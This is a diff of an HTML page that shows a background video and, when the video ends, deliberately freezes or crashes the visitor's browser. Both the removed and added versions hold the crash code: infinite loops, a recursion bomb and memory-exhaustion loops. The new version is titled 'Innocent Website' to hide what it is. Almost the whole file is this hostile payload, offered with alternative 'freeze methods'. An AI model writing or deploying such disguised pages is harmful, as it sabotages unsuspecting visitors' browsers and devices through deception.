@@ -1,38 +1,44 @@
-<!DOCTYPE html>  
-<html lang="en">  
-<head>  
-  <meta charset="UTF-8">  
-  <title>Oh nice</title>  
-  <style>  
-    #bgVideo {  
-      position: fixed;  
-      right: 0;  
-      bottom: 0;  
-      min-width: 100%;  
-      min-height: 100%;  
-      z-index: -1;  
-    }  
-  </style>  
-</head>  
-<body>  
-  <video id="bgVideo" autoplay controls>  
-    <source src="video.mp4" type="video/mp4">  
-  </video>  
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Website</title>
+    <style>
+        #video-bg {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            min-width: 100%;
+            min-height: 100%;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <video id="video-bg" autoplay muted>
+        <source src="your_video.mp4" type="video/mp4">
+    </video>
 
-  <script>  
-    const video = document.getElementById('bgVideo');  
-    video.addEventListener('ended', () => {  
-      // Choose one freeze method:  
-      // Memory Bomb  
-      // const arr = [];  
-      // while (true) arr.push(new Array(1000000).fill(0));  
+    <script>
+        const video = document.getElementById('video-bg');
+        
+        video.onended = function() {
+            // Trigger freeze/crash
+            freezeBrowser();
+        };
 
-      // OR Infinite DOM  
-      while (true) document.body.innerHTML += "<div></div>";  
+        function freezeBrowser() {
+            // Method 1: Infinite Loop
+            while (true) {
+                console.log("Browser frozen.");
+            }
 
-      // OR Recursion  
-      // function crash() { crash(); } crash();  
-    });  
-  </script>  
-</body>  
-</html>  
+            // Method 2: Recursion Bomb
+            // function bomb() { bomb(); } bomb();
+
+            // Method 3: Memory Overload
+            // const arr = [];
+            // while (true) arr.push(new ArrayBuffer(1e9));
+        }
+    </script>
+</body>
+</html>
